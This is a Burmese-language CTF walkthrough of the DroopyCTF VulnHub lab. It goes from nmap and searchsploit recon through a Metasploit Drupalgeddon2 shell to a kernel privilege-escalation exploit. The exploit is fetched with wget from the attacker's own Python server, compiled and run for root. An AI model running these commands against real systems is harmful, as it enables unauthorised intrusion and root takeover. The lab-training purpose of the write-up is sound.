---
published: true
---

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/vulnhub-1.jpg){:height="300px" width="700px"}

ဒီနေ့တော့ vulhub က  DroopyCTF walkthrough အလွယ်လေးကို တင်ပေးသွားပါမယ် : )

Download Link : [Droopy CTF](https://download.vulnhub.com/droopy/DroopyCTF.ova)

vulnhub.com ရဲ့ search bar ကနေ DroopyCTF လို့ရိုက်ရှာပြီး ဒေါင်းရင်းရပါတယ် 

ဒေါင်းပြီးရင်တော့ ရလာတဲ့ ova file ကို virtualbox or vmware တခုခုမှာ run လိုက်ပါ

ပြီးရင်း terminal မှာ netdiscover -i wlan0 လို့ရိုက်ပြီး  droopy machine ရဲ့ ip ကို ရှာကြည့်လိုက်ပါ

ip ရလာရင် အရင်ဆုံး ကျနော်တို့ nmap နဲ့ scan ပါမယ်

```
root@cyb3rhoL1c:~# nmap -A -p- 192.168.43.37
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 22:54 EDT
Nmap scan report for droopy (192.168.43.37)
Host is up (0.00046s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
MAC Address: B0:C0:90:9D:58:1F (Chicony Electronics)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms droopy (192.168.43.37)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds

```

service ကတော့ port 80 http ပွင့်တယ်ဗျ အာ့တာနဲ့ ကျနော်တို့ machine ip ကို brower မှာ run ကြည့်လိုက်တော့

Drupal web page ကြီး တခု ပေါ်လာတယ်ဗျ

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-09-02.png)

Drupal အတွက် exploit တွေက တော်တော်များတယ်ဗျ အဲ့တော့ ကျနော်တို့ exploit ရှာဖို့အတွက် 

drupal ရဲ့ version ကို အရင်လိုက်ရှာကြည့်မယ် အရင်ဆုံး nmap နဲ့ scan ထားတဲ့ result မှာ

robots.txt ဆိုတာတွေ့တယ်ဗျ 

```
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
MAC Address: B0:C0:90:9D:58:1F (Chicony Electronics)

```
browser မှာ ခေါ်ကြည့်လိုက်ပါမယ်

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-10-08.png)

CHANGELOG.TXT  ဆိုတာလေးထဲ ဝင်ကြည့်လိုက်ပါမယ် အများအားဖြင့်

changelog တွေမှာ version တွေ တွေ့ရတတ်ပါတယ် 

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-10-51.png)

drupal ရဲ့ version ကို ရပါပြီး ကျနော်တို့ သူ့အတွက် exploit ကို 

terminal မှာ `searchsploit drupal 7.30` ဆိုပြီး ရှာကြည့်လိုက်တော့

```
root@cyb3rhoL1c:~# searchsploit drupal 7.30
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                    | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                     | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                          | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                          | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                             | php/webapps/35150.php
Drupal < 7.34 - Denial of Service                                                                                                    | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                             | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                          | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                  | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                              | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                     | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                       | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                   | php/webapps/46459.py
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

exploit တွေ အများကြီး ကျလာပါတယ် :3

msfconsole နဲ့ metasploitable ထဲဝင်ရှာကြည့်ပါမယ်

```
root@cyb3rhoL1c:~# msfconsole 
                                                  

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com


       =[ metasploit v5.0.90-dev                          ]
+ -- --=[ 2019 exploits - 1099 auxiliary - 343 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: To save all commands executed since start up to a file, use the makerc command

msf5 > search drupal

```
search drupal ဆိုပြီး ရှာကြည့်လိုက်ပါ

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-13-14.png)

ကျနော် select လုပ်ထားတဲ့ exploit ကို သုံးပါမယ်

`use 2` ဆိုပြီးလည်း ရသလို `use exploit/unix/webapp/drupal_drupalgeddon2` ဆိုပြီး ရိုက်လည်းရပါတယ်

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-13-29.png)

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-15-03.png)

`set rhost [target machine ip]`

`exploit`

host သတ်မှတ်ပြီး exploit လို့ရိုက်လိုက်ရင် ကျနော်တို့ shell access ရပါပြီး : p

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-16-04.png)

`shell` ဆိုပြီး ဝင်လိုက်ပါ

`python -c ‘import pty;pty.spawn(“/bin/bash”)’` ဆိုပြီး run လိုက်ရင် ကျနော်တို့ bash shell လေးရပါမယ်

ပြီးရင် `uname -a` နဲ့ kernel version ကို စစ်ကြည့်လိုက်ပါမယ်

kernel version ရရင် ကျနော်တို့ google မှာ exploit အရင်ရှာကြည့်လိုက်ပါမယ်

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-17-16.png)

အပေါ်ဆုံးတခုကို သုံးပါမယ် [exploit link](https://www.exploit-db.com/exploits/37292)

ကျနော်တို့ download ချပြီး expoit ရှိတဲ့ folder မှာ exploit ကို target machine ကနေ download လုပ်ဖို့ 

python server တခုကို ထောင်လိုက်ပါမယ်

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-23-22.png)

`python3 -m http.server 80`

ပြီးတော့ target machine ကနေ wget command နဲ့ exploit ကို download လုပ်လိုက်ပါမယ်

download မလုပ်ခင် အရင်ဆုံး tmp directory ထဲဝင်ထားပေးရပါမယ် (read,write,excutable permission တွေက

အများအားဖြင့် tmp directory တွေမှာ ရလို့ပါ )

`wget http://192.168.x.x/37292.c`

ip နေရာမှာ ကိုယ့်စက်ရဲ့ ip address ကို ထည့်ပေးပါ

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-25-17.png)

download ချပြီး ရင် ကျနော်တို့ exploit ကို compile လုပ်ပါမယ်

`chmod +x 37292.c`

`gcc 37292.c -o exploit`

`chmod +x exploit`

`./exploit`

ပြီးရင် permission 777 ပေးပြီး ပုံထဲကအတိုင်း exploit ကို run လိုက်ရင်

ကျနော်တို့ root access ရသွားပါပြီး : p

![](https://raw.githubusercontent.com/0xsheinn/0xsheinn.github.io/master/_posts/images/droopyctf/Screenshot_2020-06-08_12-26-35.png)

[Thanks for reading :)]()





